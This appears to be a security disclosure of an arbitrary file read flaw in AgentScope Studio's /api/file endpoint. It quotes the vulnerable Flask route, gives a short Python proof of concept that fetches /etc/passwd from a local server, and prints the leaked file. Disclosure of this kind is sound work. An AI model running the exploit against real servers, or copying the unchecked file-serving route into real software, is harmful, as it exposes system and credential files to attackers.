# Description

`src/agentscope/studio/_app.py` allowed attackers to read arbitrary files.

```python
@_app.route("/api/file", methods=["GET"])
def _get_file() -> Any:
    """Get the local file via the url."""
    file_path = request.args.get("path", None)

    if file_path is not None:
        try:
            file = send_file(file_path)
            return file
        except FileNotFoundError:
            return jsonify({"error": "File not found."})
    return jsonify({"error": "File not found."})

```

# Proof of Concept

```
import requests

url_base = 'http://127.0.0.1:5000'
def get_file_lfi():
    return requests.get(
        url=f'{url_base}/api/file',
        params={'path':'/etc/passwd'}
    )


if __name__ == "__main__":
    print(get_file_lfi().content)
```

Respones:

```yaml
:!python3 exp.py
b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:
/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache
/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var
/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:u
ucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-dat
a:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbi
n/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd
:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gn
ats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd
-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-r
esolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:102:105:
:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:103:106:systemd Time Synchronization,,
,:/run/systemd:/usr/sbin/nologin\nsyslog:x:104:111::/home/syslog:/usr/sbin/nologin\n_apt:x
:105:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:106:112::/run/uuidd:/usr/sbin/nologin\
ntcpdump:x:107:113::/nonexistent:/usr/sbin/nologin\nretr0:x:1000:1000:,,,:/home/retr0:/usr
```

# Impact

reading arbitrary files.